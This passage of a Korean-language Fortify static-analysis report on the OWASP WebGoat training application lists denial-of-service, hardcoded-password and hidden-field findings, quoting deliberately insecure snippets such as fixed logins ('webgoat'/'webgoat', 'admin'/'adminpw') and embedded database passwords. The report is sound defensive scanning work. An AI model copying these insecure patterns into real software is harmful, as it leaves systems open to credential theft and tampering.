<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4C50968EDF96913C90CF91771A091481" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Encoding.java의 줄 727에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>727</LineStart>
<Snippet>		{
			hexBuff.append( "%" );
			hexBuff.append( Integer.toHexString( ascii[i] ) );
		}
		return hexBuff.toString().toUpperCase();</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4348193075BDABC9B473468D553F5F2D" ruleID="F2BD85B8-504E-4D52-967C-E00A043BAFAD">
                            <Category>Denial of Service: StringBuilder</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WebSession.java의 줄 498에 있는 append() 호출은 기본 백업 배열 크기(16)로 초기화된 StringBuilder 또는 StringBuffer 인스턴스에 신뢰할 수 없는 데이터를 추가합니다. 그러면 JVM이 힙 메모리 공간을 과소비하게 될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>498</LineStart>
<Snippet>			else
				query.append("&amp;");
			query.append(parameter);
		}
		</Snippet>
<TargetFunction>java.lang.StringBuffer.append()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>468</LineStart>
<Snippet>		List&lt;String&gt; parameters = new ArrayList&lt;String&gt;();
		
		String screenValue = request.getParameter(SCREEN);
		if (screenValue != null)
			parameters.add(SCREEN + "=" + screenValue);</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="19">
                        <groupTitle>Password Management: Hardcoded Password</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>암호를 하드코드하는 것은 좋은 방법이 아닙니다. 암호 하드코드는 모든 프로젝트 개발자가 암호를 볼 수 있을 뿐 아니라 문제 해결을 극히 어렵게 만듭니다. 코드가 운영 단계에 들어가면 소프트웨어 패치 없이는 암호를 변경할 수 없습니다. 암호로 보호되는 계정이 손상되면 시스템 소유자는 보안과 가용성 중 한 가지를 선택해야 합니다.


예제 1: 다음 코드는 hardcoded password 암호를 사용하여 데이터베이스에 연결합니다.


...
DriverManager.getConnection(url, "scott", "tiger");
...


이 코드는 성공적으로 실행되지만 코드에 액세스할 수 있는 사용자는 암호에도 액세스할 수 있습니다. 프로그램을 공개한 후에는 프로그램에 패치를 적용해야만 데이터베이스 사용자 “scott”를 암호 “tiger”로 변경할 수 있습니다. 직원이 이 정보에 대한 접근 권한을 갖게 되면 이를 사용하여 시스템에 침입할 수 있습니다. 이보다 더 나쁜 것은 공격자가 응용 프로그램의 바이트코드에 액세스하게 되면 javap -c 명령을 사용하여 암호 값이 들어갈 디스어셈블된 코드에 액세스할 수 있다는 것입니다. Example 1의 예제를 실행한 결과는 다음과 비슷합니다.


javap -c ConnMngr.class

22: ldc   #36; //String jdbc:mysql://ixne.com/rxsql
24: ldc   #38; //String scott
26: ldc   #17; //String tiger


모바일 환경에서는 장치 분실 위험이 높기 때문에 암호 관리가 특히 중요합니다.
예제 2: 다음 코드는 하드코드된 사용자 이름과 암호를 사용하여 Android WebView로 보호된 페이지를 보기 위한 인증을 설정합니다.

...
webview.setWebViewClient(new WebViewClient() {
  public void onReceivedHttpAuthRequest(WebView view,
        HttpAuthHandler handler, String host, String realm) {
    handler.proceed("guest", "allow");
  }
});
...


Example 1과 마찬가지로 이 코드는 정상 실행되지만 코드에 접근할 수 있는 사용자는 암호에도 접근할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>암호는 하드코드해서는 안 되며 보통 난독 처리하여 외부 소스에서 관리해야 합니다. 시스템의 임의의 장소에 암호를 일반 텍스트로 저장하면 권한이 있는 사용자라면 누구나 암호를 읽어 남용할 가능성이 있습니다. 최소한 암호를 저장하기 전에 해시합니다.

일부 타사 제품은 암호를 안전하게 관리할 수 있다고 주장합니다. 예를 들면, WebSphere Application Server 4.x는 간단한 XOR 암호화 알고리즘을 사용하여 값을 난독 처리하지만 그 기능을 신뢰하기 어렵습니다. WebSphere 및 기타 응용 프로그램 서버는 보안에 민감한 환경에는 불충분한 오래되고 비교적 약한 암호화 메커니즘을 제공합니다. 현재 일반 보안 솔루션에 대한 최선의 방법은 직접 독점 메커니즘을 생성하는 것입니다.

Android의 경우 SQLite 데이터베이스를 사용하는 다른 플랫폼과 마찬가지로 SQLCipher를 대신 사용하는 것이 좋습니다. SQLCipher는 SQLite 데이터베이스에 대한 확장으로, 데이터베이스 파일의 투명한 256비트 AES 암호화를 제공합니다. 따라서 암호화된 데이터베이스에 자격 증명을 저장할 수 있습니다.

예제 3: 다음 코드는 필요한 바이너리를 다운로드한 후 SQLCipher를 Android 응용 프로그램에 통합하고 자격 증명을 데이터베이스 파일에 저장하는 방법을 보여줍니다.

import net.sqlcipher.database.SQLiteDatabase;
...
  SQLiteDatabase.loadLibs(this);
  File dbFile = getDatabasePath("credentials.db");
  dbFile.mkdirs();
  dbFile.delete();
  SQLiteDatabase db = SQLiteDatabase.openOrCreateDatabase(dbFile, "credentials", null);
  db.execSQL("create table credentials(u, p)");
  db.execSQL("insert into credentials(u, p) values(?, ?)", new Object[]{username, password});
...


android.database.sqlite.SQLiteDatabase 관련 참조는 net.sqlcipher.database.SQLiteDatabase 관련 참조로 대체됩니다.

WebView 저장소에서 암호화를 활성화하려면 sqlcipher.so 라이브러리를 사용하여 WebKit를 다시 컴파일해야 합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Fortify Java Annotations FortifyPassword 및 FortifyNotPassword를 사용하여 암호를 나타내는 필드 및 변수를 표시할 수 있습니다.

2. null 암호, 빈 암호 또는 Hardcoded Password를 식별할 때 기본 규칙은 password 단어를 포함하는 필드와 변수만 고려합니다. 그러나 Fortify Custom Rules Editor는 사용자가 이름을 지정한 필드 및 변수의 암호 관리 이슈 감지에 필요한 규칙을 쉽게 만들 수 있는 Password Management 마법사를 제공합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>19</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="868A60798788EDC729D0E0F48F20A84E" ruleID="F9D3C462-8D1E-4457-967F-9F082B973F88">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>137</LineStart>
<Snippet>		loginID = encode("webgoat12345");
	    }
	    else if (username.equals("aspect") &amp;&amp; password.equals("aspect"))
	    {
		loginID = encode("aspect12345");</Snippet>
<TargetFunction>FunctionCall: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DE7FF93CBA90C5D81119A46A72EA5016" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>68</LineStart>
<Snippet>     *  Description of the Field
     */
    protected final static String PASSWORD = "Password";

    /**</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A0122DA0000C619783ECEE640A4B2842" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>70</LineStart>
<Snippet>     *  Description of the Field
     */
    protected final static String PASSWORD = "Password";

    /**</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5564F8A8AE1FDB216F90CD53FF4C5C83" ruleID="F9D3C462-8D1E-4457-967F-9F082B973F88">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>133</LineStart>
<Snippet>	    String loginID = "";

	    if (username.equals("webgoat") &amp;&amp; password.equals("webgoat"))
	    {
		loginID = encode("webgoat12345");</Snippet>
<TargetFunction>FunctionCall: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DFE5CCB06D8F608016DD7B1BC4E28D5B" ruleID="5FC849F9-EBBB-49C9-8F48-45368F98C83E">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>98</LineStart>
<Snippet>		Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
		return DriverManager
			.getConnection("jdbc:odbc:;DRIVER=Microsoft Access Driver (*.mdb);DBQ="
				+ dbName + ";PWD=webgoat");
	    }</Snippet>
<TargetFunction>getConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BEE9F012D21B9F3AC42A682BBEE278A7" ruleID="F9D3C462-8D1E-4457-967F-9F082B973F88">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>76</LineStart>
<Snippet>
		// if credentials are bad, send the login page
		if (!"webgoat".equals(username) || !password.equals("webgoat"))
		{
		    s.setMessage("Invalid username and password entered.");</Snippet>
<TargetFunction>FunctionCall: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7AEA3CBD88E206BEE5FB1E06CB42B00E" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LogSpoofing.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/LogSpoofing.java</FilePath>
<LineStart>59</LineStart>
<Snippet>    private static final String USERNAME = "username";

    private static final String PASSWORD = "password";

    private final static IMG MAC_LOGO = new IMG("images/logos/macadamian.gif").setAlt(</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8A34872802D40BEFBDFF8522BED488E6" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>XPATHInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XPATHInjection.java</FilePath>
<LineStart>79</LineStart>
<Snippet>    private final static String USERNAME = "Username";

    private final static String PASSWORD = "Password";

    private final static IMG MAC_LOGO = new IMG("images/logos/macadamian.gif").setAlt(</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5720CC1A72AB7536B69D6A13E69A4154" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>64</LineStart>
<Snippet>     *  Description of the Field
     */
    protected final static String PASSWORD = "Password";

    /**</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1A6D75C955CDD71301B61428E35E8346" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>88</LineStart>
<Snippet>    public final static String FIRST_NAME = "firstName";

    public final static String PASSWORD = "password";

    public final static String EMPLOYEE_ID = "employee_id";</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="43D35901E78406A60F044F2F407F9A53" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>108</LineStart>
<Snippet>     *  Description of the Field
     */
    protected final static String PASSWORD = "Password";

    /**</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F12D3DA6BF02CCF50D438E74A1F8176C" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ECSFactory.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ECSFactory.java</FilePath>
<LineStart>70</LineStart>
<Snippet>     */

    public final static String PASSWORD = "Password";

</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="16C3FBC37D6B8D7A61AAF7D7F5225500" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WsSAXInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSAXInjection.java</FilePath>
<LineStart>69</LineStart>
<Snippet>{

    private final static String PASSWORD = "password";

    private String password;</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C9F66C7212252423D2CBA090538D5087" ruleID="ACBE009D-CD38-4DDC-BB9A-FC9CD21FCEC4">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>147</LineStart>
<Snippet>	    call.setReturnType(XMLType.XSD_STRING);
	    call.setUsername("guest");
	    call.setPassword("guest");
	    call.setTargetEndpointAddress("http://localhost/WebGoat/services/"
		    + serv);</Snippet>
<TargetFunction>setPassword()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="816CEA48BCEC6903A18B76736450F08D" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>95</LineStart>
<Snippet>    public final static String FIRST_NAME = "firstName";

    public final static String PASSWORD = "password";

    public final static String EMPLOYEE_ID = "employee_id";</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C6B7BABAA6543DC3A46BEF45A9E04C1C" ruleID="CFD5D7C5-08EB-4D20-AE29-28C05CDA4B92">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>CreateDB.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/CreateDB.java</FilePath>
<LineStart>70</LineStart>
<Snippet>
	    connection = DriverManager
		    .getConnection(
			    "jdbc:odbc:;DRIVER=Microsoft Access Driver (*.mdb);DBQ=c:/webgoat.mdb;PWD=webgoat",
			    "webgoat", "webgoat");</Snippet>
<TargetFunction>getConnection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="07F7D341F663504EA1ACCCF8305C4C13" ruleID="F9D3C462-8D1E-4457-967F-9F082B973F88">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>HtmlClues.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HtmlClues.java</FilePath>
<LineStart>83</LineStart>
<Snippet>
	//&lt;START_OMIT_SOURCE&gt;
	return (username.equals("admin") &amp;&amp; password.equals("adminpw"));
	//&lt;END_OMIT_SOURCE&gt;
    }</Snippet>
<TargetFunction>FunctionCall: equals()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FFD30B48DE13CEE114F59E2141897423" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>HtmlClues.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HtmlClues.java</FilePath>
<LineStart>63</LineStart>
<Snippet>     *  Description of the Field
     */
    protected final static String PASSWORD = "Password";

    /**</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C7BA3E1B5FA2A87891ACE2703B58FF9C" ruleID="C204F020-1CA1-4c25-A6CB-BAA69CA2DA0B">
                            <Category>Password Management: Hardcoded Password</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Hardcoded Password는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>94</LineStart>
<Snippet>    public final static String FIRST_NAME = "firstName";

    public final static String PASSWORD = "password";

    public final static String EMPLOYEE_ID = "employee_id";</Snippet>
<TargetFunction>FieldAccess: PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="15">
                        <groupTitle>Hidden Field</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>숨겨진 폼 필드가 EditProfile.jsp의 122 줄에 사용됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>프로그래머는 흔히 사용자가 내용을 보거나 조작할 수 없을 것으로 기대하며 숨겨진 필드의 내용을 신뢰합니다. 공격자는 이러한 가정을 위반합니다. 공격자는 숨겨진 필드에 기록된 값을 관찰하고 수정하거나 공격 데이터로 내용을 교체합니다.

예제: hidden 형식의 &lt;input&gt; 태그는 숨겨진 필드를 사용하고 있음을 나타냅니다.

&lt;input type="hidden"&gt;


숨겨진 필드에 민감한 정보가 있는 경우, 이 정보는 페이지의 나머지 부분 캐시 방법과 동일한 방법으로 캐시됩니다. 그러면 사용자에게 알리지 않고 민감한 정보가 브라우저 캐시에서 숨겨질 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>공격자가 응용 프로그램에서 숨겨진 필드의 모든 사용을 검사하고 해독한다고 예상하십시오. 숨겨진 필드는 신뢰할 수 없는 입력인 것으로 간주해야 합니다. 정보가 페이지의 나머지 부분과 함께 캐시되지 않아야 하는 경우, 숨겨진 필드에 정보를 저장하지 마십시오.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>15</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="CD83647E67EDA4BFB5EDF60573C7BA3B" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 EditProfile.jsp의 126 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>126</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=RoleBasedAccessControl.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="9316BBE3F97DD886FEB0C22EFD4F9CFC" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 ViewProfile.jsp의 142 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>142</LineStart>
<Snippet>					%&gt;
						&lt;form method="POST" action="attack?menu=&lt;%=webSession.getCurrentMenu()%&gt;"&gt;
							&lt;input type="hidden" name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.DELETEPROFILE_ACTION%&gt;"/&gt;
						&lt;/form&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="CD83647E67EDA4BFB5EDF60573C7BA3A" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>숨겨진 폼 필드가 EditProfile.jsp의 125 줄에 사용됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>125</LineStart>
<Snippet>				  		
                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=RoleBasedAccessControl.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=RoleBasedAccessControl.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=RoleBasedAccessControl.UPDATEPROFILE_ACTION%&gt;"/&gt;</Snippet>
                            </Primary>
                        </Issue>
